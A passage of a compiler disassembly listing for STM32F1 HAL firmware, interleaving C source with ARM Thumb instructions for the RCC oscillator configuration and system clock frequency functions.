  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 800072c:	6803      	ldr	r3, [r0, #0]
{
 800072e:	e92d 41f3 	stmdb	sp!, {r0, r1, r4, r5, r6, r7, r8, lr}
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8000732:	07db      	lsls	r3, r3, #31
{
 8000734:	4605      	mov	r5, r0
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8000736:	d410      	bmi.n	800075a <HAL_RCC_OscConfig+0x2e>
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/ 
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8000738:	682b      	ldr	r3, [r5, #0]
 800073a:	079f      	lsls	r7, r3, #30
 800073c:	d45e      	bmi.n	80007fc <HAL_RCC_OscConfig+0xd0>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/ 
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 800073e:	682b      	ldr	r3, [r5, #0]
 8000740:	0719      	lsls	r1, r3, #28
 8000742:	f100 8095 	bmi.w	8000870 <HAL_RCC_OscConfig+0x144>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/ 
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8000746:	682b      	ldr	r3, [r5, #0]
 8000748:	075a      	lsls	r2, r3, #29
 800074a:	f100 80bf 	bmi.w	80008cc <HAL_RCC_OscConfig+0x1a0>

#endif /* RCC_CR_PLL2ON */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));
  if ((RCC_OscInitStruct->PLL.PLLState) != RCC_PLL_NONE)
 800074e:	69ea      	ldr	r2, [r5, #28]
 8000750:	2a00      	cmp	r2, #0
 8000752:	f040 812d 	bne.w	80009b0 <HAL_RCC_OscConfig+0x284>
    {
      return HAL_ERROR;
    }
  }
  
  return HAL_OK;
 8000756:	2000      	movs	r0, #0
 8000758:	e014      	b.n	8000784 <HAL_RCC_OscConfig+0x58>
    if((__HAL_RCC_GET_SYSCLK_SOURCE() == RCC_SYSCLKSOURCE_STATUS_HSE) 
 800075a:	4c90      	ldr	r4, [pc, #576]	; (800099c <HAL_RCC_OscConfig+0x270>)
 800075c:	6863      	ldr	r3, [r4, #4]
 800075e:	f003 030c 	and.w	r3, r3, #12
 8000762:	2b04      	cmp	r3, #4
 8000764:	d007      	beq.n	8000776 <HAL_RCC_OscConfig+0x4a>
       || ((__HAL_RCC_GET_SYSCLK_SOURCE() == RCC_SYSCLKSOURCE_STATUS_PLLCLK) && (__HAL_RCC_GET_PLL_OSCSOURCE() == RCC_PLLSOURCE_HSE)))
 8000766:	6863      	ldr	r3, [r4, #4]
 8000768:	f003 030c 	and.w	r3, r3, #12
 800076c:	2b08      	cmp	r3, #8
 800076e:	d10c      	bne.n	800078a <HAL_RCC_OscConfig+0x5e>
 8000770:	6863      	ldr	r3, [r4, #4]
 8000772:	03de      	lsls	r6, r3, #15
 8000774:	d509      	bpl.n	800078a <HAL_RCC_OscConfig+0x5e>
      if((__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) != RESET) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8000776:	6823      	ldr	r3, [r4, #0]
 8000778:	039c      	lsls	r4, r3, #14
 800077a:	d5dd      	bpl.n	8000738 <HAL_RCC_OscConfig+0xc>
 800077c:	686b      	ldr	r3, [r5, #4]
 800077e:	2b00      	cmp	r3, #0
 8000780:	d1da      	bne.n	8000738 <HAL_RCC_OscConfig+0xc>
        return HAL_ERROR;
 8000782:	2001      	movs	r0, #1
}
 8000784:	b002      	add	sp, #8
 8000786:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 800078a:	686b      	ldr	r3, [r5, #4]
 800078c:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8000790:	d110      	bne.n	80007b4 <HAL_RCC_OscConfig+0x88>
 8000792:	6823      	ldr	r3, [r4, #0]
 8000794:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8000798:	6023      	str	r3, [r4, #0]
        tickstart = HAL_GetTick();
 800079a:	f7ff fd19 	bl	80001d0 <HAL_GetTick>
 800079e:	4606      	mov	r6, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) == RESET)
 80007a0:	6823      	ldr	r3, [r4, #0]
 80007a2:	0398      	lsls	r0, r3, #14
 80007a4:	d4c8      	bmi.n	8000738 <HAL_RCC_OscConfig+0xc>
          if((HAL_GetTick() - tickstart ) > HSE_TIMEOUT_VALUE)
 80007a6:	f7ff fd13 	bl	80001d0 <HAL_GetTick>
 80007aa:	1b80      	subs	r0, r0, r6
 80007ac:	2864      	cmp	r0, #100	; 0x64
 80007ae:	d9f7      	bls.n	80007a0 <HAL_RCC_OscConfig+0x74>
            return HAL_TIMEOUT;
 80007b0:	2003      	movs	r0, #3
 80007b2:	e7e7      	b.n	8000784 <HAL_RCC_OscConfig+0x58>
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 80007b4:	b99b      	cbnz	r3, 80007de <HAL_RCC_OscConfig+0xb2>
 80007b6:	6823      	ldr	r3, [r4, #0]
 80007b8:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80007bc:	6023      	str	r3, [r4, #0]
 80007be:	6823      	ldr	r3, [r4, #0]
 80007c0:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 80007c4:	6023      	str	r3, [r4, #0]
        tickstart = HAL_GetTick();
 80007c6:	f7ff fd03 	bl	80001d0 <HAL_GetTick>
 80007ca:	4606      	mov	r6, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) != RESET)
 80007cc:	6823      	ldr	r3, [r4, #0]
 80007ce:	0399      	lsls	r1, r3, #14
 80007d0:	d5b2      	bpl.n	8000738 <HAL_RCC_OscConfig+0xc>
           if((HAL_GetTick() - tickstart ) > HSE_TIMEOUT_VALUE)
 80007d2:	f7ff fcfd 	bl	80001d0 <HAL_GetTick>
 80007d6:	1b80      	subs	r0, r0, r6
 80007d8:	2864      	cmp	r0, #100	; 0x64
 80007da:	d9f7      	bls.n	80007cc <HAL_RCC_OscConfig+0xa0>
 80007dc:	e7e8      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 80007de:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 80007e2:	6823      	ldr	r3, [r4, #0]
 80007e4:	d103      	bne.n	80007ee <HAL_RCC_OscConfig+0xc2>
 80007e6:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80007ea:	6023      	str	r3, [r4, #0]
 80007ec:	e7d1      	b.n	8000792 <HAL_RCC_OscConfig+0x66>
 80007ee:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80007f2:	6023      	str	r3, [r4, #0]
 80007f4:	6823      	ldr	r3, [r4, #0]
 80007f6:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 80007fa:	e7cd      	b.n	8000798 <HAL_RCC_OscConfig+0x6c>
    if((__HAL_RCC_GET_SYSCLK_SOURCE() == RCC_SYSCLKSOURCE_STATUS_HSI) 
 80007fc:	4c67      	ldr	r4, [pc, #412]	; (800099c <HAL_RCC_OscConfig+0x270>)
 80007fe:	6863      	ldr	r3, [r4, #4]
 8000800:	f013 0f0c 	tst.w	r3, #12
 8000804:	d007      	beq.n	8000816 <HAL_RCC_OscConfig+0xea>
       || ((__HAL_RCC_GET_SYSCLK_SOURCE() == RCC_SYSCLKSOURCE_STATUS_PLLCLK) && (__HAL_RCC_GET_PLL_OSCSOURCE() == RCC_PLLSOURCE_HSI_DIV2)))
 8000806:	6863      	ldr	r3, [r4, #4]
 8000808:	f003 030c 	and.w	r3, r3, #12
 800080c:	2b08      	cmp	r3, #8
 800080e:	d110      	bne.n	8000832 <HAL_RCC_OscConfig+0x106>
 8000810:	6863      	ldr	r3, [r4, #4]
 8000812:	03da      	lsls	r2, r3, #15
 8000814:	d40d      	bmi.n	8000832 <HAL_RCC_OscConfig+0x106>
      if((__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) != RESET) && (RCC_OscInitStruct->HSIState != RCC_HSI_ON))
 8000816:	6823      	ldr	r3, [r4, #0]
 8000818:	079b      	lsls	r3, r3, #30
 800081a:	d502      	bpl.n	8000822 <HAL_RCC_OscConfig+0xf6>
 800081c:	692b      	ldr	r3, [r5, #16]
 800081e:	2b01      	cmp	r3, #1
 8000820:	d1af      	bne.n	8000782 <HAL_RCC_OscConfig+0x56>
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8000822:	6823      	ldr	r3, [r4, #0]
 8000824:	696a      	ldr	r2, [r5, #20]
 8000826:	f023 03f8 	bic.w	r3, r3, #248	; 0xf8
 800082a:	ea43 03c2 	orr.w	r3, r3, r2, lsl #3
 800082e:	6023      	str	r3, [r4, #0]
 8000830:	e785      	b.n	800073e <HAL_RCC_OscConfig+0x12>
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8000832:	692a      	ldr	r2, [r5, #16]
 8000834:	4b5a      	ldr	r3, [pc, #360]	; (80009a0 <HAL_RCC_OscConfig+0x274>)
 8000836:	b16a      	cbz	r2, 8000854 <HAL_RCC_OscConfig+0x128>
        __HAL_RCC_HSI_ENABLE();
 8000838:	2201      	movs	r2, #1
 800083a:	601a      	str	r2, [r3, #0]
        tickstart = HAL_GetTick();
 800083c:	f7ff fcc8 	bl	80001d0 <HAL_GetTick>
 8000840:	4606      	mov	r6, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) == RESET)
 8000842:	6823      	ldr	r3, [r4, #0]
 8000844:	079f      	lsls	r7, r3, #30
 8000846:	d4ec      	bmi.n	8000822 <HAL_RCC_OscConfig+0xf6>
          if((HAL_GetTick() - tickstart ) > HSI_TIMEOUT_VALUE)
 8000848:	f7ff fcc2 	bl	80001d0 <HAL_GetTick>
 800084c:	1b80      	subs	r0, r0, r6
 800084e:	2802      	cmp	r0, #2
 8000850:	d9f7      	bls.n	8000842 <HAL_RCC_OscConfig+0x116>
 8000852:	e7ad      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
        __HAL_RCC_HSI_DISABLE();
 8000854:	601a      	str	r2, [r3, #0]
        tickstart = HAL_GetTick();
 8000856:	f7ff fcbb 	bl	80001d0 <HAL_GetTick>
 800085a:	4606      	mov	r6, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) != RESET)
 800085c:	6823      	ldr	r3, [r4, #0]
 800085e:	0798      	lsls	r0, r3, #30
 8000860:	f57f af6d 	bpl.w	800073e <HAL_RCC_OscConfig+0x12>
          if((HAL_GetTick() - tickstart ) > HSI_TIMEOUT_VALUE)
 8000864:	f7ff fcb4 	bl	80001d0 <HAL_GetTick>
 8000868:	1b80      	subs	r0, r0, r6
 800086a:	2802      	cmp	r0, #2
 800086c:	d9f6      	bls.n	800085c <HAL_RCC_OscConfig+0x130>
 800086e:	e79f      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8000870:	69aa      	ldr	r2, [r5, #24]
 8000872:	4c4a      	ldr	r4, [pc, #296]	; (800099c <HAL_RCC_OscConfig+0x270>)
 8000874:	4b4b      	ldr	r3, [pc, #300]	; (80009a4 <HAL_RCC_OscConfig+0x278>)
 8000876:	b1da      	cbz	r2, 80008b0 <HAL_RCC_OscConfig+0x184>
      __HAL_RCC_LSI_ENABLE();
 8000878:	2201      	movs	r2, #1
 800087a:	601a      	str	r2, [r3, #0]
      tickstart = HAL_GetTick();
 800087c:	f7ff fca8 	bl	80001d0 <HAL_GetTick>
 8000880:	4606      	mov	r6, r0
      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSIRDY) == RESET)
 8000882:	6a63      	ldr	r3, [r4, #36]	; 0x24
 8000884:	079b      	lsls	r3, r3, #30
 8000886:	d50d      	bpl.n	80008a4 <HAL_RCC_OscConfig+0x178>
  * @param  mdelay: specifies the delay time length, in milliseconds.
  * @retval None
  */
static void RCC_Delay(uint32_t mdelay)
{
  __IO uint32_t Delay = mdelay * (SystemCoreClock / 8U / 1000U);
 8000888:	f44f 52fa 	mov.w	r2, #8000	; 0x1f40
 800088c:	4b46      	ldr	r3, [pc, #280]	; (80009a8 <HAL_RCC_OscConfig+0x27c>)
 800088e:	681b      	ldr	r3, [r3, #0]
 8000890:	fbb3 f3f2 	udiv	r3, r3, r2
 8000894:	9301      	str	r3, [sp, #4]
  \brief   No Operation
  \details No Operation does nothing. This instruction can be used for code alignment purposes.
 */
__attribute__((always_inline)) __STATIC_INLINE void __NOP(void)
{
  __ASM volatile ("nop");
 8000896:	bf00      	nop
  do 
  {
    __NOP();
  } 
  while (Delay --);
 8000898:	9b01      	ldr	r3, [sp, #4]
 800089a:	1e5a      	subs	r2, r3, #1
 800089c:	9201      	str	r2, [sp, #4]
 800089e:	2b00      	cmp	r3, #0
 80008a0:	d1f9      	bne.n	8000896 <HAL_RCC_OscConfig+0x16a>
 80008a2:	e750      	b.n	8000746 <HAL_RCC_OscConfig+0x1a>
        if((HAL_GetTick() - tickstart ) > LSI_TIMEOUT_VALUE)
 80008a4:	f7ff fc94 	bl	80001d0 <HAL_GetTick>
 80008a8:	1b80      	subs	r0, r0, r6
 80008aa:	2802      	cmp	r0, #2
 80008ac:	d9e9      	bls.n	8000882 <HAL_RCC_OscConfig+0x156>
 80008ae:	e77f      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
      __HAL_RCC_LSI_DISABLE();
 80008b0:	601a      	str	r2, [r3, #0]
      tickstart = HAL_GetTick();
 80008b2:	f7ff fc8d 	bl	80001d0 <HAL_GetTick>
 80008b6:	4606      	mov	r6, r0
      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSIRDY) != RESET)
 80008b8:	6a63      	ldr	r3, [r4, #36]	; 0x24
 80008ba:	079f      	lsls	r7, r3, #30
 80008bc:	f57f af43 	bpl.w	8000746 <HAL_RCC_OscConfig+0x1a>
        if((HAL_GetTick() - tickstart ) > LSI_TIMEOUT_VALUE)
 80008c0:	f7ff fc86 	bl	80001d0 <HAL_GetTick>
 80008c4:	1b80      	subs	r0, r0, r6
 80008c6:	2802      	cmp	r0, #2
 80008c8:	d9f6      	bls.n	80008b8 <HAL_RCC_OscConfig+0x18c>
 80008ca:	e771      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
    if(__HAL_RCC_PWR_IS_CLK_DISABLED())
 80008cc:	4c33      	ldr	r4, [pc, #204]	; (800099c <HAL_RCC_OscConfig+0x270>)
 80008ce:	69e3      	ldr	r3, [r4, #28]
 80008d0:	00d8      	lsls	r0, r3, #3
 80008d2:	d424      	bmi.n	800091e <HAL_RCC_OscConfig+0x1f2>
      pwrclkchanged = SET;
 80008d4:	2701      	movs	r7, #1
      __HAL_RCC_PWR_CLK_ENABLE();
 80008d6:	69e3      	ldr	r3, [r4, #28]
 80008d8:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80008dc:	61e3      	str	r3, [r4, #28]
 80008de:	69e3      	ldr	r3, [r4, #28]
 80008e0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80008e4:	9300      	str	r3, [sp, #0]
 80008e6:	9b00      	ldr	r3, [sp, #0]
    if(HAL_IS_BIT_CLR(PWR->CR, PWR_CR_DBP))
 80008e8:	4e30      	ldr	r6, [pc, #192]	; (80009ac <HAL_RCC_OscConfig+0x280>)
 80008ea:	6833      	ldr	r3, [r6, #0]
 80008ec:	05d9      	lsls	r1, r3, #23
 80008ee:	d518      	bpl.n	8000922 <HAL_RCC_OscConfig+0x1f6>
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 80008f0:	68eb      	ldr	r3, [r5, #12]
 80008f2:	2b01      	cmp	r3, #1
 80008f4:	d126      	bne.n	8000944 <HAL_RCC_OscConfig+0x218>
 80008f6:	6a23      	ldr	r3, [r4, #32]
 80008f8:	f043 0301 	orr.w	r3, r3, #1
 80008fc:	6223      	str	r3, [r4, #32]
      tickstart = HAL_GetTick();
 80008fe:	f7ff fc67 	bl	80001d0 <HAL_GetTick>
        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)
 8000902:	f241 3688 	movw	r6, #5000	; 0x1388
      tickstart = HAL_GetTick();
 8000906:	4680      	mov	r8, r0
      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSERDY) == RESET)
 8000908:	6a23      	ldr	r3, [r4, #32]
 800090a:	079b      	lsls	r3, r3, #30
 800090c:	d53f      	bpl.n	800098e <HAL_RCC_OscConfig+0x262>
    if(pwrclkchanged == SET)
 800090e:	2f00      	cmp	r7, #0
 8000910:	f43f af1d 	beq.w	800074e <HAL_RCC_OscConfig+0x22>
      __HAL_RCC_PWR_CLK_DISABLE();
 8000914:	69e3      	ldr	r3, [r4, #28]
 8000916:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 800091a:	61e3      	str	r3, [r4, #28]
 800091c:	e717      	b.n	800074e <HAL_RCC_OscConfig+0x22>
    FlagStatus       pwrclkchanged = RESET;
 800091e:	2700      	movs	r7, #0
 8000920:	e7e2      	b.n	80008e8 <HAL_RCC_OscConfig+0x1bc>
      SET_BIT(PWR->CR, PWR_CR_DBP);
 8000922:	6833      	ldr	r3, [r6, #0]
 8000924:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8000928:	6033      	str	r3, [r6, #0]
      tickstart = HAL_GetTick();
 800092a:	f7ff fc51 	bl	80001d0 <HAL_GetTick>
 800092e:	4680      	mov	r8, r0
      while(HAL_IS_BIT_CLR(PWR->CR, PWR_CR_DBP))
 8000930:	6833      	ldr	r3, [r6, #0]
 8000932:	05da      	lsls	r2, r3, #23
 8000934:	d4dc      	bmi.n	80008f0 <HAL_RCC_OscConfig+0x1c4>
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8000936:	f7ff fc4b 	bl	80001d0 <HAL_GetTick>
 800093a:	eba0 0008 	sub.w	r0, r0, r8
 800093e:	2864      	cmp	r0, #100	; 0x64
 8000940:	d9f6      	bls.n	8000930 <HAL_RCC_OscConfig+0x204>
 8000942:	e735      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8000944:	b9ab      	cbnz	r3, 8000972 <HAL_RCC_OscConfig+0x246>
 8000946:	6a23      	ldr	r3, [r4, #32]
        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)
 8000948:	f241 3888 	movw	r8, #5000	; 0x1388
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 800094c:	f023 0301 	bic.w	r3, r3, #1
 8000950:	6223      	str	r3, [r4, #32]
 8000952:	6a23      	ldr	r3, [r4, #32]
 8000954:	f023 0304 	bic.w	r3, r3, #4
 8000958:	6223      	str	r3, [r4, #32]
      tickstart = HAL_GetTick();
 800095a:	f7ff fc39 	bl	80001d0 <HAL_GetTick>
 800095e:	4606      	mov	r6, r0
      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSERDY) != RESET)
 8000960:	6a23      	ldr	r3, [r4, #32]
 8000962:	0798      	lsls	r0, r3, #30
 8000964:	d5d3      	bpl.n	800090e <HAL_RCC_OscConfig+0x1e2>
        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)
 8000966:	f7ff fc33 	bl	80001d0 <HAL_GetTick>
 800096a:	1b80      	subs	r0, r0, r6
 800096c:	4540      	cmp	r0, r8
 800096e:	d9f7      	bls.n	8000960 <HAL_RCC_OscConfig+0x234>
 8000970:	e71e      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8000972:	2b05      	cmp	r3, #5
 8000974:	6a23      	ldr	r3, [r4, #32]
 8000976:	d103      	bne.n	8000980 <HAL_RCC_OscConfig+0x254>
 8000978:	f043 0304 	orr.w	r3, r3, #4
 800097c:	6223      	str	r3, [r4, #32]
 800097e:	e7ba      	b.n	80008f6 <HAL_RCC_OscConfig+0x1ca>
 8000980:	f023 0301 	bic.w	r3, r3, #1
 8000984:	6223      	str	r3, [r4, #32]
 8000986:	6a23      	ldr	r3, [r4, #32]
 8000988:	f023 0304 	bic.w	r3, r3, #4
 800098c:	e7b6      	b.n	80008fc <HAL_RCC_OscConfig+0x1d0>
        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)
 800098e:	f7ff fc1f 	bl	80001d0 <HAL_GetTick>
 8000992:	eba0 0008 	sub.w	r0, r0, r8
 8000996:	42b0      	cmp	r0, r6
 8000998:	d9b6      	bls.n	8000908 <HAL_RCC_OscConfig+0x1dc>
 800099a:	e709      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
 800099c:	40021000 	.word	0x40021000
 80009a0:	42420000 	.word	0x42420000
 80009a4:	42420480 	.word	0x42420480
 80009a8:	2000186c 	.word	0x2000186c
 80009ac:	40007000 	.word	0x40007000
    if(__HAL_RCC_GET_SYSCLK_SOURCE() != RCC_SYSCLKSOURCE_STATUS_PLLCLK)
 80009b0:	4c22      	ldr	r4, [pc, #136]	; (8000a3c <HAL_RCC_OscConfig+0x310>)
 80009b2:	6863      	ldr	r3, [r4, #4]
 80009b4:	f003 030c 	and.w	r3, r3, #12
 80009b8:	2b08      	cmp	r3, #8
 80009ba:	f43f aee2 	beq.w	8000782 <HAL_RCC_OscConfig+0x56>
 80009be:	2300      	movs	r3, #0
 80009c0:	4e1f      	ldr	r6, [pc, #124]	; (8000a40 <HAL_RCC_OscConfig+0x314>)
      if((RCC_OscInitStruct->PLL.PLLState) == RCC_PLL_ON)
 80009c2:	2a02      	cmp	r2, #2
        __HAL_RCC_PLL_DISABLE();
 80009c4:	6033      	str	r3, [r6, #0]
      if((RCC_OscInitStruct->PLL.PLLState) == RCC_PLL_ON)
 80009c6:	d12b      	bne.n	8000a20 <HAL_RCC_OscConfig+0x2f4>
        tickstart = HAL_GetTick();
 80009c8:	f7ff fc02 	bl	80001d0 <HAL_GetTick>
 80009cc:	4607      	mov	r7, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  != RESET)
 80009ce:	6823      	ldr	r3, [r4, #0]
 80009d0:	0199      	lsls	r1, r3, #6
 80009d2:	d41f      	bmi.n	8000a14 <HAL_RCC_OscConfig+0x2e8>
        if(RCC_OscInitStruct->PLL.PLLSource == RCC_PLLSOURCE_HSE)
 80009d4:	6a2b      	ldr	r3, [r5, #32]
 80009d6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80009da:	d105      	bne.n	80009e8 <HAL_RCC_OscConfig+0x2bc>
          __HAL_RCC_HSE_PREDIV_CONFIG(RCC_OscInitStruct->HSEPredivValue);
 80009dc:	6862      	ldr	r2, [r4, #4]
 80009de:	68a9      	ldr	r1, [r5, #8]
 80009e0:	f422 3200 	bic.w	r2, r2, #131072	; 0x20000
 80009e4:	430a      	orrs	r2, r1
 80009e6:	6062      	str	r2, [r4, #4]
        __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 80009e8:	6a69      	ldr	r1, [r5, #36]	; 0x24
 80009ea:	6862      	ldr	r2, [r4, #4]
 80009ec:	430b      	orrs	r3, r1
 80009ee:	f422 1274 	bic.w	r2, r2, #3997696	; 0x3d0000
 80009f2:	4313      	orrs	r3, r2
 80009f4:	6063      	str	r3, [r4, #4]
        __HAL_RCC_PLL_ENABLE();
 80009f6:	2301      	movs	r3, #1
 80009f8:	6033      	str	r3, [r6, #0]
        tickstart = HAL_GetTick();
 80009fa:	f7ff fbe9 	bl	80001d0 <HAL_GetTick>
 80009fe:	4605      	mov	r5, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  == RESET)
 8000a00:	6823      	ldr	r3, [r4, #0]
 8000a02:	019a      	lsls	r2, r3, #6
 8000a04:	f53f aea7 	bmi.w	8000756 <HAL_RCC_OscConfig+0x2a>
          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)
 8000a08:	f7ff fbe2 	bl	80001d0 <HAL_GetTick>
 8000a0c:	1b40      	subs	r0, r0, r5
 8000a0e:	2802      	cmp	r0, #2
 8000a10:	d9f6      	bls.n	8000a00 <HAL_RCC_OscConfig+0x2d4>
 8000a12:	e6cd      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)
 8000a14:	f7ff fbdc 	bl	80001d0 <HAL_GetTick>
 8000a18:	1bc0      	subs	r0, r0, r7
 8000a1a:	2802      	cmp	r0, #2
 8000a1c:	d9d7      	bls.n	80009ce <HAL_RCC_OscConfig+0x2a2>
 8000a1e:	e6c7      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
        tickstart = HAL_GetTick();
 8000a20:	f7ff fbd6 	bl	80001d0 <HAL_GetTick>
 8000a24:	4605      	mov	r5, r0
        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  != RESET)
 8000a26:	6823      	ldr	r3, [r4, #0]
 8000a28:	019b      	lsls	r3, r3, #6
 8000a2a:	f57f ae94 	bpl.w	8000756 <HAL_RCC_OscConfig+0x2a>
          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)
 8000a2e:	f7ff fbcf 	bl	80001d0 <HAL_GetTick>
 8000a32:	1b40      	subs	r0, r0, r5
 8000a34:	2802      	cmp	r0, #2
 8000a36:	d9f6      	bls.n	8000a26 <HAL_RCC_OscConfig+0x2fa>
 8000a38:	e6ba      	b.n	80007b0 <HAL_RCC_OscConfig+0x84>
 8000a3a:	bf00      	nop
 8000a3c:	40021000 	.word	0x40021000
 8000a40:	42420060 	.word	0x42420060

08000a44 <HAL_RCC_GetSysClockFreq>:
{
 8000a44:	b530      	push	{r4, r5, lr}
  const uint8_t aPLLMULFactorTable[16] = {2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 16};
 8000a46:	4b19      	ldr	r3, [pc, #100]	; (8000aac <HAL_RCC_GetSysClockFreq+0x68>)
{
 8000a48:	b087      	sub	sp, #28
  const uint8_t aPLLMULFactorTable[16] = {2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 16};
 8000a4a:	ac02      	add	r4, sp, #8
 8000a4c:	f103 0510 	add.w	r5, r3, #16
 8000a50:	4622      	mov	r2, r4
 8000a52:	6818      	ldr	r0, [r3, #0]
 8000a54:	6859      	ldr	r1, [r3, #4]
 8000a56:	3308      	adds	r3, #8
 8000a58:	c203      	stmia	r2!, {r0, r1}
 8000a5a:	42ab      	cmp	r3, r5
 8000a5c:	4614      	mov	r4, r2
 8000a5e:	d1f7      	bne.n	8000a50 <HAL_RCC_GetSysClockFreq+0xc>
  const uint8_t aPredivFactorTable[2] = {1, 2};
 8000a60:	2301      	movs	r3, #1
 8000a62:	f88d 3004 	strb.w	r3, [sp, #4]
 8000a66:	2302      	movs	r3, #2
  tmpreg = RCC->CFGR;
 8000a68:	4911      	ldr	r1, [pc, #68]	; (8000ab0 <HAL_RCC_GetSysClockFreq+0x6c>)
  const uint8_t aPredivFactorTable[2] = {1, 2};
 8000a6a:	f88d 3005 	strb.w	r3, [sp, #5]
  tmpreg = RCC->CFGR;
 8000a6e:	684b      	ldr	r3, [r1, #4]
  switch (tmpreg & RCC_CFGR_SWS)
 8000a70:	f003 020c 	and.w	r2, r3, #12
 8000a74:	2a08      	cmp	r2, #8
 8000a76:	d117      	bne.n	8000aa8 <HAL_RCC_GetSysClockFreq+0x64>
      pllmul = aPLLMULFactorTable[(uint32_t)(tmpreg & RCC_CFGR_PLLMULL) >> RCC_CFGR_PLLMULL_Pos];
 8000a78:	f3c3 4283 	ubfx	r2, r3, #18, #4
 8000a7c:	a806      	add	r0, sp, #24
 8000a7e:	4402      	add	r2, r0
      if ((tmpreg & RCC_CFGR_PLLSRC) != RCC_PLLSOURCE_HSI_DIV2)
 8000a80:	03db      	lsls	r3, r3, #15
      pllmul = aPLLMULFactorTable[(uint32_t)(tmpreg & RCC_CFGR_PLLMULL) >> RCC_CFGR_PLLMULL_Pos];
 8000a82:	f812 2c10 	ldrb.w	r2, [r2, #-16]
      if ((tmpreg & RCC_CFGR_PLLSRC) != RCC_PLLSOURCE_HSI_DIV2)
 8000a86:	d50c      	bpl.n	8000aa2 <HAL_RCC_GetSysClockFreq+0x5e>
        prediv = aPredivFactorTable[(uint32_t)(RCC->CFGR & RCC_CFGR_PLLXTPRE) >> RCC_CFGR_PLLXTPRE_Pos];
 8000a88:	684b      	ldr	r3, [r1, #4]
        pllclk = (uint32_t)((HSE_VALUE  * pllmul) / prediv);
 8000a8a:	480a      	ldr	r0, [pc, #40]	; (8000ab4 <HAL_RCC_GetSysClockFreq+0x70>)
